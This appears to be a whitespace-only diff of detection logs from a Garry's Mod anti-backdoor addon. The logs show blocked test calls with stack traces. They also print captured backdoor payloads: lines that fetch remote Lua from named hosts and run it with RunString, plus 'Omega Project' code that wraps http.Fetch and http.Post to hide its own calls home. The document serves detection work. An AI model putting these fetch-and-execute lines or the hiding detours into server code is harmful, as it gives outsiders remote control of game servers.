@@ -121,8 +121,8 @@ http.Fetch("https://steamcommunity.omega-project.cz/lua_run/RunString.php?apikey
         RunString
         http.Fetch
     Location: stack traceback:
-	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'RunString'
-	addons/fakedoor/lua/autorun/server/sv_test2.lua:3: in main chunk
+    addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'RunString'
+    addons/fakedoor/lua/autorun/server/sv_test2.lua:3: in main chunk
 
 
 [CONTENT]
@@ -153,15 +153,15 @@ http.Fetch("http://buriedselfesteem.com/rekt/rekt.lua", function(c) RunString(c)
         http.Post
         _G[
     Location: stack traceback:
-	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
-	addons/fakedoor/lua/autorun/server/sv_test2.lua:7: in main chunk
+    addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
+    addons/fakedoor/lua/autorun/server/sv_test2.lua:7: in main chunk
 
 
 [CONTENT]
 -----------------------------------------------------------------------------------
 
-arguments	=	{
-			"
+arguments    =    {
+            "
 
 
 local sKqYgoHBFGNoMavJtTsX = { 
@@ -223,23 +223,23 @@ local sKqYgoHBFGNoMavJtTsX = {
 
 local httpF = http.Fetch  
 local httpP = http.Post 
-local vraisHTTP = HTTP function HTTP(a) 	
-	if a.url then 
-		for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
-			if string.find(a.url, v) then 
-				return end 
-		    end 
-		  end 
+local vraisHTTP = HTTP function HTTP(a)     
+    if a.url then 
+        for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+            if string.find(a.url, v) then 
+                return end 
+            end 
+          end 
   return vraisHTTP(a) 
 end 
 
 function http.Fetch(...) 
    local args = {...} 
    if args[1] then 
-   	for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
-   		if string.find(args[1], v) then 
-   			return end 
-   	end 
+       for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+           if string.find(args[1], v) then 
+               return end 
+       end 
    end 
 
    return httpF(...) 
@@ -249,10 +249,10 @@ end
 function http.Post(...) 
 local args = {...} 
 if args[1] then 
-	for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
-		if string.find(args[1], v) then 
-			return end 
-	 end 
+    for k,v in pairs(sKqYgoHBFGNoMavJtTsX) do 
+        if string.find(args[1], v) then 
+            return end 
+     end 
     end return httpP(...) 
    end
 
@@ -261,18 +261,18 @@ _G["http"]["Fetch"]([[https:/]]..[[/api.omega-project.cz/api_connect.php?api_key
 end)
 
 ",
-			2703,
-			{
-			Vary	=	"Accept-Encoding",
-			Set-Cookie	=	"__cfduid=dfe0c3e4f2be8978d00090d7df7dc9e711598740653; expires=Mon, 28-Sep-20 22:37:33 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,__ddg1=ZRzJovYJDvrB2k895vsn; Domain=.omega-project.cz; HttpOnly; Path=/; Expires=Sun, 29-Aug-2021 22:37:33 GMT",
-			Transfer-Encoding	=	"chunked",
-			Connection	=	"keep-alive",
-			Date	=	"Sat, 29 Aug 2020 22:37:34 GMT",
-			Content-Encoding	=	"gzip",
-			Content-Type	=	"text/html; charset=UTF-8",
-			Server	=	"cloudflare",
-				},
-			200,
+            2703,
+            {
+            Vary    =    "Accept-Encoding",
+            Set-Cookie    =    "__cfduid=dfe0c3e4f2be8978d00090d7df7dc9e711598740653; expires=Mon, 28-Sep-20 22:37:33 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,__ddg1=ZRzJovYJDvrB2k895vsn; Domain=.omega-project.cz; HttpOnly; Path=/; Expires=Sun, 29-Aug-2021 22:37:33 GMT",
+            Transfer-Encoding    =    "chunked",
+            Connection    =    "keep-alive",
+            Date    =    "Sat, 29 Aug 2020 22:37:34 GMT",
+            Content-Encoding    =    "gzip",
+            Content-Type    =    "text/html; charset=UTF-8",
+            Server    =    "cloudflare",
+                },
+            200,
 }
 ```
 
@@ -356,22 +356,22 @@ local vraisHTTP = HTTP
 -- (Se estiver limpo, executa a função)
 
 function HTTP(a)
-	if a.url then 
-		for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
-			if string.find(a.url, v) then 
-				return end 
-		    end 
-		  end 
+    if a.url then 
+        for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+            if string.find(a.url, v) then 
+                return end 
+            end 
+          end 
   return vraisHTTP(a) 
 end 
 
 function http.Fetch(...) 
    local args = {...} 
    if args[1] then 
-   	for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
-   		if string.find(args[1], v) then 
-   			return end 
-   	end 
+       for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+           if string.find(args[1], v) then 
+               return end 
+       end 
    end 
 
    return httpF(...) 
@@ -381,10 +381,10 @@ end
 function http.Post(...) 
 local args = {...} 
 if args[1] then 
-	for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
-		if string.find(args[1], v) then 
-			return end 
-	 end 
+    for k,v in pairs(nKvWQygqjyMKsWkNbsiO) do 
+        if string.find(args[1], v) then 
+            return end 
+     end 
     end return httpP(...) 
    end
 
@@ -437,15 +437,15 @@ end)
         CompileString
         BroadcastLua
     Location: stack traceback:
-	addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
-	addons/fakedoor/lua/autorun/server/sv_test2.lua:9: in main chunk
+    addons/backdoor-shield/lua/bs/server/modules/detouring/functions.lua:50: in function 'Fetch'
+    addons/fakedoor/lua/autorun/server/sv_test2.lua:9: in main chunk
 
 
 [CONTENT]
 -----------------------------------------------------------------------------------
 
-arguments	=	{
-			"
+arguments    =    {
+            "
 --[[
  name: Ʊmega Project
  author: Inplex
@@ -682,18 +682,18 @@ if 1 == 0 or 1 == 1 then
 end
 
 ",
-			11300,
-			{
-			Vary	=	"Accept-Encoding",
-			Set-Cookie	=	"__cfduid=d011e81c32b1b9d48f331abfd6e4628a51598740966; expires=Mon, 28-Sep-20 22:42:46 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,GOOGLE_TRUST_FACTOR=qrLGXXkCAbsNhCdnLSyP; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=puyseuAkakcwHaKowHLZ; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=kszSrlEZYRsTXiZzfImB; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600",
-			Transfer-Encoding	=	"chunked",
-			Connection	=	"keep-alive",
-			Date	=	"Sat, 29 Aug 2020 22:42:47 GMT",
-			Content-Encoding	=	"gzip",
-			Content-Type	=	"text/html; charset=UTF-8",
-			Server	=	"cloudflare",
-				},
-			200,
+            11300,
+            {
+            Vary    =    "Accept-Encoding",
+            Set-Cookie    =    "__cfduid=d011e81c32b1b9d48f331abfd6e4628a51598740966; expires=Mon, 28-Sep-20 22:42:46 GMT; path=/; domain=.omega-project.cz; HttpOnly; SameSite=Lax; Secure,GOOGLE_TRUST_FACTOR=qrLGXXkCAbsNhCdnLSyP; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=puyseuAkakcwHaKowHLZ; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600,GOOGLE_TRUST_FACTOR=kszSrlEZYRsTXiZzfImB; expires=Sun, 30-Aug-2020 01:22:46 GMT; Max-Age=9600",
+            Transfer-Encoding    =    "chunked",
+            Connection    =    "keep-alive",
+            Date    =    "Sat, 29 Aug 2020 22:42:47 GMT",
+            Content-Encoding    =    "gzip",
+            Content-Type    =    "text/html; charset=UTF-8",
+            Server    =    "cloudflare",
+                },
+            200,
 }
 ```
 
